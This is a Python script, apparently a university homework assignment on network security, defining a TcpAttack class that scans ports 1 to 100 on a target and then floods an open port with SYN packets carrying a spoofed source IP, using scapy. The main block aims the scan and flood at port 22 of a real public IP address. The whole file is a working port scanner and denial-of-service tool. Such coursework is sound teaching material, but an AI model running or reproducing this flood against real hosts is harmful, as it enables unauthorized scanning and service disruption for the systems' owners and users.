#!/usr/bin/env python

#HW08
#Matteo G. Miglio
#ECN Login: miglio@purdue.edu
#Due Date: 03/30/2021

import sys, socket
from scapy.all import *

class TcpAttack:
    def __init__(self,spoofIP,targetIP):
        self.spoofIP, self.targetIP = spoofIP, targetIP

    def scanTarget(self,rangeStart,rangeEnd):
        open_ports = [] 
        #establish a socket and connect to specified port of IP
        for testport in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, testport))
                open_ports.append(testport)
                print("Successfully conncected to ", testport)
            except Exception as e:                                                                  
                print("Could not connect, ERROR:", e)

        with open("openports.txt", "w") as openF:
            for i in range(len(open_ports)):
                openF.write(str(open_ports[i]))
                openF.write("\n")

    def attackTarget(self, port, numSyn):
        #reconnect to port to see if it is open for attack
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        try:
            sock.connect((self.targetIP, port))
        except Exception as e:   
            return False       
        #create a SYN packet and send that to open port via DoS flooding attack                                                        
        for _ in range(numSyn):
            IP_header = IP(src=self.spoofIP, dst=self.targetIP)
            TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
            packet = IP_header / TCP_header
            try:
                send(packet)
            except Exception as exception:
                print("Cannot send packet: ", exception)
                return False

        return True

if __name__ == '__main__':
    #fake local IP address
    spoofIP = '192.168.254.18'
    #target IP address for public ECN IP
    targetIP = '128.46.4.83'
    #check 100 ports
    rangeStart = 1
    rangeEnd = 100
    #ssh is port 22
    port = 22
    #create object and call methods
    Tcp = TcpAttack(spoofIP, targetIP)
    Tcp.scanTarget(rangeStart, rangeEnd)
    if Tcp.attackTarget(port, 10):
        print("Port ", str(port), " was able to be attacked.")
    else:
        print("Port" , str(port), " was not able to be attacked")